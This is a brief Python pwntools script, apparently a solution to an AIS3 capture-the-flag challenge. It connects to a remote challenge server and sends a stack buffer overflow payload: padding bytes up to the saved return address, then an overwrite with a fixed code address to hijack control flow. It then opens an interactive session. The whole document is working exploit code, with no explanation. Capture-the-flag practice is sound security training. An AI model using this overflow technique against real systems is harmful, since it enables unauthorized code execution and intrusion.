from pwn import *

r = remote('mf-pwn.ais3.org', 10100)

start_address = 0x7fffffffdc90
return_address = 0x7fffffffdcf8
target = 0x40067a

payload = b'A' * (return_address - start_address) + p64(target)
r.sendlineafter('Are you hacker? Show me your skill :)\n', payload)

r.interactive()
